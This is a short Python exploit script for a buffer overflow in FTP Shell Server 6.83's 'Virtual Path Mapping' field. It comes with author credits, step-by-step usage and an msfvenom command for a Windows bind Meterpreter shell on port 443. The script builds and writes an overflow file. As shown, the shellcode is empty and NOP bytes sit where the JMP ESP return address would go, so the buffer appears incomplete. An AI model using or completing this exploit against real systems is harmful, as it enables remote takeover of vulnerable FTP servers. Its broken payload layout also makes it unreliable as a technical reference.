#!/usr/bin/python
# Exploit Title: FTP Shell Server 6.83 'Virtual Path Mapping' Buffer Overflow
# Date: 09-04-2019
# Exploit Author: Dino Covotsos - Telspace Systems
# Vendor Homepage: http://www.ftpshell.com/index.htm
# Version: 6.83
# Software Link : http://www.ftpshell.com/downloadserver.htm
# Contact: services[@]telspace.co.za
# Twitter: @telspacesystems
# Tested on: Windows XP SP3 ENG x86
# CVE: TBC from Mitre
# Created during 2019 Intern Training
# Greetz Amy, Delicia, Greg, Tonderai, Nzanoa & Telspace Systems Crew
# PoC:
# 1.) Generate ftpshell.txt, copy the contents to clipboard
# 2.) In the application, open 'Manage FTP Accounts' -> "Configure Accounts" -> "Add Path"
# 3.) Paste the contents of ftpshell.txt in "Virtual Path Mapping"
# 4.) Click "OK" and you'll have a bind meterpreter shell on port 443
#7E429353   FFE4             JMP ESP

#msfvenom -a x86 --platform windows -p windows/meterpreter/bind_tcp LPORT=443 -e x86/alpha_mixed -b "\x00\xd5\x0a\x0d\x1a\x03" -f c
shellcode = b""

buffer = b""
buffer += b"A" * 395
buffer += b"\x90" * 4
buffer += b"\x90" * 20
buffer += shellcode
buffer += b"C" * 211

try:
    f=open("ftpshell.txt","wb")
    print("[+] Creating %s bytes evil payload.." %len(buffer))
    f.write(buffer)
    f.close()
    print("[+] File created!")
except:
    print("File cannot be created")